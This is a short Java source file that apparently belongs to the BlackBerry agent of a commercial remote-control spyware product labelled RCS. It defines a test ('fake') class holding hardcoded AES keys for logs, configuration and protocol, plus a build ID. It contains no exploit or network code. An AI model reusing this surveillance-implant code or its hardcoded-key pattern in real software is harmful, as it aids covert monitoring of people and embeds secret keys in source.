//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/
package fake;

import blackberry.config.KeysGetter;

/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake extends KeysGetter {

    public byte[] byteLogKey;
    public byte[] byteConfKey;
    public byte[] byteProtoKey;
    public String buildID = "RCS_0000000000";

    public InstanceKeysFake() {
        //#ifdef FAKECONF
        // RCS 746
        byteLogKey = new byte[] { (byte) 0x12, (byte) 0x35, (byte) 0xcb,
                (byte) 0xcb, (byte) 0x67, (byte) 0x90, (byte) 0xfa,
                (byte) 0x3c, (byte) 0xd2, (byte) 0xd9, (byte) 0x8f,
                (byte) 0x05, (byte) 0x28, (byte) 0xfb, (byte) 0xb7, (byte) 0x73 };
        byteConfKey = new byte[] { (byte) 0x14, (byte) 0x17, (byte) 0xd7,
                (byte) 0xb7, (byte) 0x1d, (byte) 0xf3, (byte) 0x2f,
                (byte) 0xbf, (byte) 0x21, (byte) 0x40, (byte) 0x31,
                (byte) 0x57, (byte) 0x2c, (byte) 0xd1, (byte) 0xd7, (byte) 0xc9 };
        byteProtoKey = new byte[] { (byte) 0x57, (byte) 0x2e, (byte) 0xbc,
                (byte) 0x94, (byte) 0x39, (byte) 0x12, (byte) 0x81,
                (byte) 0xcc, (byte) 0xf5, (byte) 0x3a, (byte) 0x85,
                (byte) 0x13, (byte) 0x30, (byte) 0xbb, (byte) 0x0d, (byte) 0x99 };
        buildID = "RCS_0000000746";
        //#endif
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return buildID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return byteConfKey;
    }

}
